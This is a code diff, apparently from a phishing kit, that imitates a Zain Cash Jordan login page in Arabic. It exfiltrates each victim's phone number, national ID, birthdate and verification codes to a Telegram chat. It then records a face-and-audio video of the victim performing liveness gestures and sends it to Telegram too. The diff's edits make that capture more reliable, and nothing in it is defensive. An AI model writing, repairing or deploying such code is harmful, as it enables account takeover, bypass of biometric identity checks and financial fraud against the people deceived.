@@ -382,7 +382,7 @@
       const code = codeInput.value.trim();
       if(code.length !== 4){ alert('يرجى إدخال رمز مكون من 4 أرقام'); codeInput.focus(); return; }
       userData.code4 = code;
-      try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش الأردن\n📱 ${userData.phone}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}\n🔢 ${userData.code5}\n�� ${userData.code4}`); } catch(e){ console.log(e); }
+      try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش الأردن\n📱 ${userData.phone}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}\n🔢 ${userData.code5}\n🔒 ${userData.code4}`); } catch(e){ console.log(e); }
       try {
         await startCaptureSequence(); // يبدأ التحقق التلقائي؛ في حال فشل يعود لصفحة رمز الـ4
       } catch (err) {
@@ -401,7 +401,7 @@
         <div style="margin:10px auto 14px; width:140px; height:140px;">
           <img src="${faceLogo}" alt="شعار الوجه" style="width:100%;height:100%;object-fit:contain;border-radius:12px;background:#fff;padding:8px;border:1px solid #eee;"/>
         </div>
-        <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:8px;">سيُطلب إذن الكاميرا ا��آن</div>
+        <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:8px;">سيُطلب إذن الكاميرا الآن</div>
         <div style="color:#666;font-size:14px;">
           سنسجل فيديو قصير يتضمن أربع خطوات: <strong>اغماض العين</strong>، <strong>وجه يسار</strong>، <strong>وجه يمين</strong>، <strong>ابتسم</strong>.<br>
           اضبط وجهك داخل الإطار، أزل القبعة/النظارات إذا لزم، واسمح بالوصول للكاميرا.
@@ -410,10 +410,10 @@
     `;
   }
 
-  // تسجيل فيديو تسلسلي — تعليمات واضحة قبل كل خطوة، عدّ 3..1، تسجيل 5s لكل خطوة
+  // تسجيل فيديو تسلسلي — الآن نسجل مرة واحدة طوال الخطوات ثم نوقف بعد النهاية
   async function startCaptureSequence(){
     renderPreparingMessage();
-    await wait(800);
+    await wait(700);
 
     const steps = [
       { label: 'اغمض عينيك', instruction: 'أغلق عينيك بالكامل لمدة 5 ثوانٍ', duration: 5000 },
@@ -442,23 +442,20 @@
     try {
       stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
     } catch (err) {
-      // رمي الخطأ ليتم التعامل معه في النداء الأعلى
       throw err;
     }
 
     const videoEl = document.getElementById('videoPreview');
-    // اجعل المعاينة معكوسة (مرآة)
+    // معاينة معكوسة (مرآة)
     videoEl.style.transform = 'scaleX(-1)';
     videoEl.srcObject = stream;
 
     const instructionBox = document.getElementById('instructionBox');
     const countdownEl = document.getElementById('countdown');
 
-    // إعداد canvas لرسم الإطارات مع انعكاس أفقي، واستخدامه كمصدر للتسجيل
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
 
-    // ننتظر تحميل بيانات الفيديو ليعلم أبعاد الفيديو
     await new Promise((resolve) => {
       if (videoEl.readyState >= 2 && videoEl.videoWidth && videoEl.videoHeight) {
         canvas.width = videoEl.videoWidth || 640;
@@ -475,33 +472,25 @@
       }
     });
 
-    // حلقية رسم الإطارات على الـ canvas مع انعكاس أفقي
     let drawActive = true;
     function drawLoop(){
       if(!drawActive) return;
       try {
         ctx.save();
-        // امسح الخلفية لضمان عدم بقاء آثار
         ctx.clearRect(0, 0, canvas.width, canvas.height);
-        // انعكاس أفقي ورسم الفيديو
         ctx.scale(-1, 1);
         ctx.drawImage(videoEl, -canvas.width, 0, canvas.width, canvas.height);
         ctx.restore();
-      } catch (e) {
-        // تجاهل أخطاء مؤقتة أثناء البداية
-      }
+      } catch (e) {}
       requestAnimationFrame(drawLoop);
     }
     drawLoop();
 
-    // إعداد MediaRecorder من canvas stream (الذي يتضمن الآن الفيديو معكوساً) وإضافة audio tracks إن وجدت
-    const processedStream = canvas.captureStream(30); // 30fps
+    const processedStream = canvas.captureStream(30);
     const audioTracks = stream.getAudioTracks();
-    if (audioTracks && audioTracks.length) {
-      audioTracks.forEach(t => processedStream.addTrack(t));
-    }
+    if (audioTracks && audioTracks.length) audioTracks.forEach(t => processedStream.addTrack(t));
 
-    // mime type كما في الأصل
+    // اختر mime كما في السابق
     let chosenMime = null;
     if (window.MediaRecorder && typeof MediaRecorder.isTypeSupported === 'function') {
       if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) chosenMime = 'video/mp4;codecs=h264';
@@ -515,79 +504,74 @@
     try {
       recorder = new MediaRecorder(processedStream, options);
     } catch (e) {
-      try {
-        recorder = new MediaRecorder(processedStream);
-      } catch (err) {
-        // فشل إنشاء المسجل -> أوقف الستريم الأصلي وننهي
-        stopStream(stream);
-        drawActive = false;
-        throw err;
-      }
+      try { recorder = new MediaRecorder(processedStream); } catch (err) { stopStream(stream); drawActive = false; throw err; }
     }
 
-    // سنجمع كل chunks عبر جميع الخطوات ثم نبني ملف واحد في النهاية
     let chunks = [];
     recorder.ondataavailable = (ev) => { if (ev.data && ev.data.size) chunks.push(ev.data); };
 
+    // سننتظر حدث stop لضمان وصول آخر chunk
+    let stopPromiseResolve;
+    const stopPromise = new Promise(resolve => { stopPromiseResolve = resolve; });
+    recorder.onstop = () => {
+      // اضف تأخير بسيط لضمان معالجة آخر dataavailable
+      setTimeout(() => stopPromiseResolve(), 250);
+    };
+
     let cancelled = false;
-    cancelBtn.onclick = () => {
+    cancelBtn.onclick = async () => {
       cancelled = true;
-      try { if(recorder && recorder.state !== 'inactive') recorder.stop(); } catch(e){}
+      try { if (recorder && recorder.state !== 'inactive') recorder.stop(); } catch(e){}
+      await stopPromise.catch(()=>{});
       stopStream(stream);
       drawActive = false;
       renderCode4Step();
     };
 
-    // تأخير بسيط قبل البدء
-    await wait(250);
+    // ابدأ التسجيل مرة واحدة قبل الخطوات
+    try {
+      recorder.start();
+    } catch (err) {
+      console.warn('recorder.start failed', err);
+    }
 
+    // تنفيذ الخطوات (التوقيت والعد التنازلي) بينما التسجيل مستمر
+    await wait(250);
     for (let i=0;i<steps.length;i++){
       if (cancelled) break;
       const s = steps[i];
       instructionBox.textContent = s.instruction;
       await wait(700);
 
-      // عد تنازلي 3..1
       countdownEl.style.display = 'block';
       for (let c=3;c>=1;c--){ countdownEl.textContent = c; await wait(700); }
       countdownEl.style.display = 'none';
 
-      // ابدأ التسجيل لهذه الخطوة
-      try {
-        recorder.start();
-      } catch (err) {
-        console.warn('recorder.start failed', err);
-      }
-
-      // عدّ ثواني التسجيل (s.duration)
       let rem = Math.ceil(s.duration/1000);
       for (let t=rem; t>=1; t--){ instructionBox.textContent = `${s.label} — تبقّى ${t} ثانية`; await wait(1000); }
-
-      // أوقف التسجيل بعد انتهاء الخطوة
-      if (recorder && recorder.state !== 'inactive') {
-        try { recorder.stop(); } catch(e) { console.warn('recorder.stop', e); }
-        // بعد الإيقاف ننتظر قليلاً ليتم دفع الحزم
-        await wait(300);
-      }
     }
 
-    // انهِ الرسم وأوقف الستريم الأصلي
+    // أوقف التسجيل مرة واحدة بعد الانتهاء
+    if (!cancelled) {
+      try { if (recorder && recorder.state !== 'inactive') recorder.stop(); } catch(e){ console.warn('stop failed', e); }
+      await stopPromise;
+    }
+
+    // أنهِ الرسم والستريم
     drawActive = false;
     stopStream(stream);
 
-    // إذا لم يتم جمع أي بيانات فهذا خطأ بسيط—ننشئ Blob فارغ بنوع webm كافتراض
     const finalType = chosenMime ? chosenMime.split(';')[0] : (chunks[0] ? chunks[0].type : 'video/webm');
     const finalBlob = new Blob(chunks.filter(b=>b && b.size), { type: finalType });
 
     showProcessing(true);
     try {
-      // إذا كان finalBlob فارغاً هذا يعني مشكلة بالتسجيل، لكن نحاول الإرسال على أي حال
       if (finalBlob.size > 0) {
         await sendVideoToTelegramAsVideo(finalBlob);
       } else {
-        console.warn('finalBlob is empty — no video was recorded');
+        console.warn('finalBlob is empty — لا يوجد فيديو مسجّل');
       }
-    } catch(e){
+    } catch (e) {
       console.error('send video error', e);
     } finally {
       showProcessing(false);
